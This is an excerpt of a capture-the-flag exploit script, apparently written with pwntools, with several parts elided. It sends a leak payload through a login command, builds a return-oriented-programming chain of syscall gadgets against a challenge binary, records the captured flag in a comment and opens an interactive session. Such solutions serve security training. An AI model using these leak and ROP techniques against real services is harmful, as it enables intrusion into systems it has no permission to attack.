...
r.wait(0.1)
payload = p32(2) + b'\x00' * 0x20 + b'123\x00' + b'123\x00'  ##leak using command_login
...
rop_gadget = [
    pop_rax_ret, stack-0x1e4, mov_eax_ptr, xchg_edi_eax_ret, pop_rax_ret, 3, sys_ret, #close fd
    ...
    xchg_edi_eax_ret, pop_rsi_ret, code_base + 0x5830, pop_rdx_r12_ret, 100, 0, pop_rax_ret, 1, sys_ret, # write frontend
]
...
print(b)
r.wait(0.5)
register(b'123',b'123') # flag{Oh!!Y00000u_pwn_the_b@ck3nd_and_g0t_root!!}
r.interactive()